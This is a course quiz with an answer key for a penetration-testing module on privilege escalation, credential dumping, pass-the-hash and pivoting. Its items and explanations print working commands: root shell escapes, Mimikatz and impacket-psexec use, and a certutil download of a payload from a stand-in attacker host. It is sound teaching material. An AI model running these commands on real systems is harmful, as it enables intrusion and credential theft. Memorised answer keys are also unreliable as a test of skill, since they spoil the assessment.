# Quiz: Module 08 — Post-Exploitation and Lateral Movement

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

**Instructions:** Select the single best answer for each question. Questions are aligned to CompTIA PenTest+ PT0-002 Domain 3: Attacks and Exploits.

---

### Question 1

A penetration tester has a low-privileged shell on a Linux target and runs `find / -perm -4000 -type f 2>/dev/null`. The command returns `/usr/bin/python`. According to GTFOBins, this can be abused for privilege escalation. Which command correctly exploits this SUID Python binary to obtain a root shell?

- A) `python -c 'import subprocess; subprocess.call("/bin/bash")'`
- B) `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
- C) `python --suid --escalate /bin/bash`
- D) `sudo python -c 'import pty; pty.spawn("/bin/sh")'`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `os.execl("/bin/sh", "sh", "-p")` replaces the current process with `/bin/sh`. The `-p` flag tells the shell to preserve the effective UID (the SUID bit's elevated UID), which is root in this case. This results in a root shell without using sudo.
- **Why A is incorrect:** `subprocess.call("/bin/bash")` spawns a bash shell but does not pass `-p`. Without `-p`, bash drops privileges to match the real UID (the low-privileged user), not the effective UID set by SUID. The escalation fails.
- **Why C is incorrect:** `--suid` and `--escalate` are not valid Python command-line flags. Python does not have built-in privilege escalation options.
- **Why D is incorrect:** This uses `sudo` to run Python, which requires the user to have sudo permission for Python listed in `/etc/sudoers`. The scenario uses a SUID binary, not sudo. Using `sudo` here would require password entry and appropriate sudo configuration.

---

### Question 2

A penetration tester runs `sudo -l` on a compromised Linux host and receives the following output:

```text
User pentest may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim
```

How can this sudo permission be abused to escalate to root?

- A) Run `sudo vim /etc/sudoers` and add the pentest user to the sudoers file, then log out and back in
- B) Run `sudo vim -c ':!/bin/sh'` to execute a shell command through vim's command mode, spawning a root shell
- C) Run `sudo vim` and use the built-in vim encryption to read `/etc/shadow`
- D) Run `sudo vim /etc/passwd` and delete the `x` from the root entry to remove the root password

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** vim's `-c` flag executes an Ex command immediately on launch. `:!` runs a shell command. Since vim is running as root via sudo, the resulting shell inherits root privileges. This is documented in GTFOBins as a standard sudo escape for vim.
- **Why A is incorrect:** While editing `/etc/sudoers` via sudo vim is technically possible, it is a more complex action requiring correct syntax and a logout/login cycle. The direct shell escape with `-c ':!/bin/sh'` is faster, cleaner, and the technique GTFOBins specifically documents.
- **Why C is incorrect:** vim does not have built-in encryption that enables reading `/etc/shadow`. vim can encrypt files it writes, but this is unrelated to reading protected files or privilege escalation.
- **Why D is incorrect:** While removing the `x` from `/etc/passwd` is a technique for removing the password requirement for root, it would require writing the file successfully and only produces passwordless local access to root — not a shell. Additionally this is unnecessarily destructive compared to the clean shell escape.

---

### Question 3

A penetration tester has SYSTEM-level access on a Windows target and wants to extract NTLM hashes from logged-in user accounts. Which Windows component stores active session credentials in memory, making it the target for tools like Mimikatz `sekurlsa::logonpasswords`?

- A) The SAM database file at `C:\Windows\System32\config\SAM`
- B) The NTDS.DIT file on the domain controller
- C) The Local Security Authority Subsystem Service (LSASS) process
- D) The Windows Credential Manager vault files in AppData

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** LSASS (lsass.exe) is the Windows process that handles authentication. It stores credentials in memory for single sign-on — including NTLM hashes, Kerberos tickets, and in some configurations plaintext passwords. Mimikatz's `sekurlsa::logonpasswords` command reads directly from LSASS memory to extract these credentials.
- **Why A is incorrect:** The SAM database stores local account password hashes persistently on disk. It is accessed with `lsadump::sam` in Mimikatz, not `sekurlsa::logonpasswords`. The SAM requires the SYSTEM key to decrypt and is locked by the OS while running.
- **Why B is incorrect:** NTDS.DIT is the Active Directory database stored on domain controllers. It contains all domain account hashes and is accessed through DCSync attacks (`lsadump::dcsync`). It is not a memory-resident credential store on workstations.
- **Why D is incorrect:** Windows Credential Manager stores credentials for specific applications and web sites, but it does not store the currently logged-in session credentials that LSASS maintains. Credential Manager is accessed with different tools and stores a different class of credentials.

---

### Question 4

A penetration tester has captured the NTLM hash `32ed87bdb5fdc5e9cba88547376818d4` for the Administrator account on a Windows target. The tester wants to authenticate to the SMB service on a second Windows machine using this hash without cracking it. Which technique does this represent, and which tool correctly performs it?

- A) Pass-the-ticket; use `Rubeus.exe ptt /ticket:32ed87bdb...`
- B) Pass-the-hash; use `impacket-psexec Administrator@TARGET_IP -hashes :32ed87bdb5fdc5e9cba88547376818d4`
- C) Kerberoasting; use `GetSPNs.py` to request a service ticket with the captured hash
- D) Overpass-the-hash; use `mimikatz sekurlsa::pth` with the SHA256 hash value

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Pass-the-hash uses an NTLM hash to authenticate to NTLM-authenticated services (SMB, WMI, etc.) without knowing the plaintext password. `impacket-psexec` accepts hashes in `LM_HASH:NTLM_HASH` format. When only the NTLM hash is known, the LM portion is left as the empty LM hash or zeros.
- **Why A is incorrect:** Pass-the-ticket (PtT) uses a Kerberos ticket (`.kirbi` file), not an NTLM hash. Rubeus is used for Kerberos attacks. The hash value shown is an NTLM hash, not a Kerberos ticket.
- **Why C is incorrect:** Kerberoasting extracts Kerberos service tickets for offline cracking. It requires valid domain credentials to request service tickets — it does not use NTLM hashes, and `GetSPNs.py` is the tool for Kerberoasting, not hash-based authentication.
- **Why D is incorrect:** Overpass-the-hash converts an NTLM hash into a Kerberos ticket for authentication (using `sekurlsa::pth`). While related, the question asks about SMB authentication using the hash — classic pass-the-hash (Option B) is the direct answer. Additionally, `sekurlsa::pth` requires the NTLM hash format, not SHA256.

---

### Question 5

A penetration tester has a Meterpreter session on a DMZ server (192.168.1.50) and wants to scan and attack an internal network (10.10.10.0/24) that is only reachable through the compromised DMZ host. Which Metasploit command correctly configures the pivot?

- A) `portfwd add -l 4444 -p 4444 -r 10.10.10.0`
- B) `run autoroute -s 10.10.10.0/24`
- C) `set LHOST 10.10.10.0`
- D) `use auxiliary/server/socks_proxy` with `set SRVPORT 10.10.10.0`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `run autoroute -s 10.10.10.0/24` adds a routing rule in Metasploit's internal routing table that directs traffic destined for the 10.10.10.0/24 network through the active Meterpreter session on 192.168.1.50. This enables subsequent Metasploit modules to reach the internal network through the pivot host.
- **Why A is incorrect:** `portfwd add` creates a port-specific forward — it maps one specific port on one specific internal IP to a local port. It does not enable routing across an entire subnet and cannot be used for broad subnet scanning.
- **Why C is incorrect:** `set LHOST` configures the attacker's listening IP for payload callbacks. It does not configure routing or pivoting. Setting LHOST to an internal subnet address makes no sense in this context.
- **Why D is incorrect:** `auxiliary/server/socks_proxy` creates a SOCKS proxy that routes traffic through Metasploit's routing table — but `set SRVPORT` takes a port number (like `1080`), not an IP address. This command as written is syntactically incorrect and would fail.

---

### Question 6

At the conclusion of a penetration test engagement, the tester realizes they installed a persistence mechanism on three Windows targets — specifically, registry Run key entries that launch a reverse shell on user login. What is the tester's professional obligation regarding these entries?

- A) The persistence entries can be left in place because they demonstrate ongoing risk to the client
- B) The persistence entries must be fully documented in the penetration test report and removed from all affected systems before the engagement closes
- C) The persistence entries only need to be removed if the client specifically requests it during the findings review
- D) The persistence entries are automatically removed when the Meterpreter session ends, so no additional action is required

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Penetration testing professional standards (including CompTIA PenTest+ exam content and PTES guidelines) require that all persistence mechanisms be documented with precise details (location, creation method, payload) and removed before engagement closure. Leaving persistence in a client environment is a serious professional failure that could be mistaken for real attacker activity and creates ongoing security risk.
- **Why A is incorrect:** Leaving persistence to "demonstrate ongoing risk" is not an acceptable professional practice. The risk is demonstrated through the report — not through leaving live backdoors. A live backdoor creates additional liability for the tester and ongoing exposure for the client.
- **Why C is incorrect:** Persistence removal is not optional — it is a professional obligation regardless of whether the client asks. The client may not know to ask, and the absence of a removal process would be a reportable deficiency in the tester's methodology.
- **Why D is incorrect:** Registry Run key entries are persistent changes to the Windows registry stored on disk. They are not session-dependent. Closing a Meterpreter session does not remove registry entries, scheduled tasks, or any other persistence mechanism that writes to the filesystem or registry.

---

### Question 7

A penetration tester wants to use a living-off-the-land technique to download a payload to a Windows target without introducing any external tools. Which native Windows binary is commonly documented for this purpose?

- A) `net.exe` — used to mount network shares and transfer files
- B) `certutil.exe` — used to download files from HTTP/HTTPS URLs as a certificate management utility
- C) `schtasks.exe` — used to download files as part of scheduled task operations
- D) `msiexec.exe` — downloads and installs files only from Microsoft Update servers

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `certutil.exe` is a legitimate Windows certificate management tool that includes a `-urlcache -split -f` option designed for certificate retrieval but widely abused to download arbitrary files from HTTP/HTTPS URLs. It is one of the most documented living-off-the-land download techniques: `certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\payload.exe`.
- **Why A is incorrect:** `net.exe` mounts SMB network shares (`net use`) and manages network resources, but it does not download files from HTTP URLs. It requires a reachable network share, not a web server.
- **Why C is incorrect:** `schtasks.exe` creates and manages scheduled tasks. It can trigger programs to run but does not have a built-in file download capability from external URLs.
- **Why D is incorrect:** `msiexec.exe` can install MSI packages from a URL (`msiexec /i http://...`), which is itself a living-off-the-land technique for payload delivery — but the answer states it only works with Microsoft Update servers, which is false. However, `certutil` is the more canonical answer for simple file download and is more commonly cited on the PT0-002 exam.

---

### Question 8

A Windows penetration test reveals that the service `VulnerableService` has its binary path set to `C:\Program Files\Vulnerable Software\app files\service.exe` without quotation marks. Which privilege escalation technique does this enable, and what is the exploitation approach?

- A) DLL hijacking — the attacker replaces the service DLL in the installation directory
- B) Unquoted service path — the attacker places a malicious executable at `C:\Program.exe` or `C:\Program Files\Vulnerable.exe` which Windows tries to execute before reaching the real binary
- C) Weak service permissions — the attacker modifies the service binary path directly in the registry
- D) AlwaysInstallElevated — the attacker creates an MSI file that Windows installs with SYSTEM privileges

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** Windows parses unquoted service paths by trying each space-delimited segment as a potential executable path. For `C:\Program Files\Vulnerable Software\app files\service.exe`, Windows tries: `C:\Program.exe`, then `C:\Program Files\Vulnerable.exe`, then `C:\Program Files\Vulnerable Software\app.exe`, before finally reaching the legitimate binary. An attacker with write access to `C:\` can place a malicious `Program.exe` that Windows executes as SYSTEM when the service starts.
- **Why A is incorrect:** DLL hijacking exploits the DLL search order when an application loads DLLs without full paths. It is a different technique from unquoted service paths. No DLL is involved in this scenario.
- **Why C is incorrect:** Weak service permissions allow an attacker to directly modify the service's `binPath` registry value to point to a malicious executable. This is a separate technique from unquoted paths — it requires explicit write access to the service's registry key.
- **Why D is incorrect:** AlwaysInstallElevated is exploited when both `HKLM` and `HKCU` registry keys are set to allow any user to install MSI packages with elevated privileges. It has no relationship to service path quoting.

---

### Question 9

Which MITRE ATT&CK tactic specifically describes techniques used to move from one compromised host to other systems within the target network using harvested credentials?

- A) TA0004 — Privilege Escalation
- B) TA0006 — Credential Access
- C) TA0008 — Lateral Movement
- D) TA0003 — Persistence

**Correct Answer:** C

**Distractor Analysis:**

- **Why C is correct:** TA0008 (Lateral Movement) is the ATT&CK tactic that encompasses techniques adversaries use to access and control additional remote systems within an environment. Pass-the-hash, PsExec-style execution, RDP hijacking, and WMI remote execution all fall under Lateral Movement.
- **Why A is incorrect:** TA0004 (Privilege Escalation) covers techniques used to gain higher-level permissions on a single compromised system — going from user to admin/SYSTEM/root on the same host.
- **Why B is incorrect:** TA0006 (Credential Access) covers techniques for stealing account credentials — password dumping, hash extraction, Kerberoasting. This precedes lateral movement but is not the tactic that describes moving between systems.
- **Why D is incorrect:** TA0003 (Persistence) covers techniques that maintain access across restarts, credential changes, and other disruptions — registry run keys, scheduled tasks, backdoors. It does not describe movement between systems.

---

### Question 10

A penetration tester has a Meterpreter session on a compromised Windows host and wants to access an internal RDP server at `192.168.100.20:3389` that is not directly reachable from the attack machine. Which Meterpreter command correctly sets up local port forwarding to accomplish this?

- A) `run autoroute -s 192.168.100.20/32`
- B) `portfwd add -l 3389 -p 3389 -r 192.168.100.20`
- C) `run post/windows/manage/enable_rdp`
- D) `portfwd add -r 3389 -l 192.168.100.20 -p 127.0.0.1`

**Correct Answer:** B

**Distractor Analysis:**

- **Why B is correct:** `portfwd add -l 3389 -p 3389 -r 192.168.100.20` creates a local port forward: `-l 3389` is the local port on the attacker's machine, `-p 3389` is the target port, and `-r 192.168.100.20` is the remote host. After this command, connecting to `localhost:3389` from the attack machine reaches `192.168.100.20:3389` through the Meterpreter session.
- **Why A is incorrect:** `autoroute -s 192.168.100.20/32` adds a routing rule for a single host, enabling Metasploit modules to reach it. It does not create a port-specific forwarding rule accessible to external tools like an RDP client. A `/32` autoroute would work for Metasploit modules but not for a direct RDP client connection from the attacker's OS.
- **Why C is incorrect:** `run post/windows/manage/enable_rdp` enables the RDP service on the currently compromised host — it does not enable access to a different machine at `192.168.100.20`. It would open RDP on the pivot host, not the target host.
- **Why D is incorrect:** The `portfwd add` flag order is incorrect. `-r` is for the remote host, `-l` is for the local port, and `-p` is for the remote port. The syntax in option D has the remote host and local port values swapped, which would produce an error or forward to the wrong destination.

---

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
